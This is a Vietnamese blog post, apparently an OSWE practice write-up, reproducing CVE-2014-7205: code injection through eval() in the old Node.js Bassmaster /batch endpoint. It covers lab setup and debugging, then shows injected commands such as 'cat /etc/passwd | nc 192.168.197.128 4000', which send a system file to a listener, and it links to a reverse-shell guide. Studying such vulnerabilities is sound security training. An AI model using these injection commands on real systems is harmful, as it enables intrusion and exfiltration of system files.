---
title: Bassmaster_nodejs_CVE-2014-7205
date: 2019-09-06T06:13:10.000+00:00
tags: cve, oswe, bassmaster

---
Đây là một cve mình thực hiện reproduce để tập luyện cho OSWE chứ Bassmaster cũng đã không còn được hỗ trợ :
[https://www.npmjs.com/package/bassmaster](https://www.npmjs.com/package/bassmaster)
và cve này cũng đã có từ 2014.

[https://www.cvedetails.com/cve/CVE-2014-7205/](https://www.cvedetails.com/cve/CVE-2014-7205/)

Bassmaster là một thư viện nodejs hỗ trợ việc thực hiện nhiều requests tới web server (cụ thể là hapi) bằng 1 request duy nhất (POST tới /batch endpoint của thư viện tạo ra). Ex:

    POST /batch
    { "requests": [
        {"method": "get", "path": "/users/1"},
        {"method": "get", "path": "/users/2"}
    ] }

## 1. Thực hiện setup môi trường exploit

Do patch bassmaster bị exploit <= 1.51 nên bạn lưu ý là cần tải đúng
version. Trên release ở github của bassmaster thì có patch 1.21 là gần
nhất 1.51 nên mình sẽ lựa chọn nó

[https://github.com/outmoded/bassmaster/releases?after=v1.9.0](https://github.com/outmoded/bassmaster/releases?after=v1.9.0)

Để cho nhanh gọn ta dùng luôn code server mẫu **batch.js** trong thư mục
**examples/** của source code. Để tránh xung đột package thì nên copy
thư mục này ra riêng và thực hiện cài đặt 2 package cần thiết thôi:

    npm install bassmaster@1.5.1
    npm install hapi@10.0.0

Sau khi cài đặt xong sẽ có được file **package.json** hơi sương sương
giống này :v:

![](/image/bassmaster/package.png)

Tiếp theo cần phải edit lại **batch.js** phần **http.register** sẽ
require **_batchmasster_** (phần này sẽ bảo hapi load plugin bassmaster
cho chúng ta)

![](/image/bassmaster/edit_batch.png)

Giờ để chạy server:

    node batch.js

Test lại:

![image](/image/bassmaster/firefox_test.png)

Ok ! Như thế ta đã có môi trường để chọc phá rồi 😁

## 2. Tiến hành phân tích code và exploit

Ta sẽ phân tích source code và debug để thực hiện exploit. Để làm như
thế ta sẽ phân tích source trong **node_modules/bassmaster/** của thưc
mục example ta chạy demo.

Trước hết chạy POST request /batch để xem behavior của web server trả về
(payload mẫu trong source code :v )

![image](/image/bassmaster/post_batch_1.png)

Ta có thể thấy payload có 3 request và response trả về sẽ có 3 kết quả
tương ứng. Vậy ta đã hiểu cơ bản của plugin này.

Nhìn vào source của **bassmaster** ta có thể thấy chỉ có file
**lib/batch.js** là cần quan tâm (may quá code của library này ít
╰(_°▽°_)╯).

Review qua ta có thể thấy được function cho **internals.batch** (feature
chính handle **/batch** ) mà ta quan tâm.

![](/image/bassmaster/batch_1.png)

Nhìn xuống source code ta thấy hàm **_eval()_** . Wow!, thực sự quá vui
khi thấy hàm này do hàm **_eval()_** rất dễ và đã bị khai thác nhiều
trong nhiều ứng dụng nodejs: [eval-and-hackers
dream](https://www.c-sharpcorner.com/article/eval-and-hackers-dream-in-javascript/)

![](/image/bassmaster/batch_debug_1.png)

Vì lý do trên ta sẽ thử khai thác eval(), trước hết do eval() nằm trong
điều kiện **_if..else_** nên ta cần biết cách để kích hoạt function này.
Nếu bạn nào code giỏi chắc đọc vào là biết liền chứ mình hơi gà nên đành
debug thủ công 😢.

Câu lệnh **eval()** thực hiện câu lệnh có biến **_parts\[i\].value_** nên
ta sẽ xuất biến này ra để xem nó là gì. Đồng thời trong điều kiện
**_if..else_** thấy thêm 1 biến **path** có thể có giá trị cần quan tâm:

![](/image/bassmaster/batch_debug_2.png)

![](/image/bassmaster/batch_debug_3.png)

Thực hiện chạy lại code đã thay đổi và xem thông tin xuất ra:

![](/image/bassmaster/console_log_1.png)

Có thể thấy từ log trên, trong 3 request của payload thì chỉ có request
cuối là được thực hiện trong **eval()**

    { "method": "get", "path": "/item/$1.id"}

Từ định dạng của request trên và source code ta có thể hiểu được
**eval()** sẽ thực hiện các request path có các kí tự :

    var requestRegex = /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g; 

Từ đó ta sẽ thực hiện inject code vào hàm eval() theo định dạng request
**$1.id**

Thử inject câu lệnh nc:

    nc 192.168.197.128 4000 (đang bật nc listen ở ip tương ứng)

![](/image/bassmastertest_nc.png)

Ta nhận được kết quả:

![](/image/bassmaster/kali.png)

Ok như vậy ta đã inject thành công. Thử câu lệnh

    cat /etc/passwd | nc 192.168.197.128 4000

Lưu ý các regex đặc biệt cần phải chuyển sang hex code, có thể dò ở đây:

[https://www.utf8-chartable.de/unicode-utf8-table.pl?unicodeinhtml=hex](https://www.utf8-chartable.de/unicode-utf8-table.pl?unicodeinhtml=hex)

![image](/image/bassmaster/exploit.png)

Ta được kết quả ở nc server:

![image](/image/bassmaster/kali_2.png)

Như thế ta đã exploit thành công bassmaster, nếu bạn muốn nhúng các
shell nodejs khác có thể tham khảo thêm:

[https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/](https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/)

Bài viết kết thúc ở đây rồi ‘😜.Bạn có lấy file thực hiện tại link này:

[bassmaster_cve](/archive/bassmaster_cve.zip)

Thanks for reading !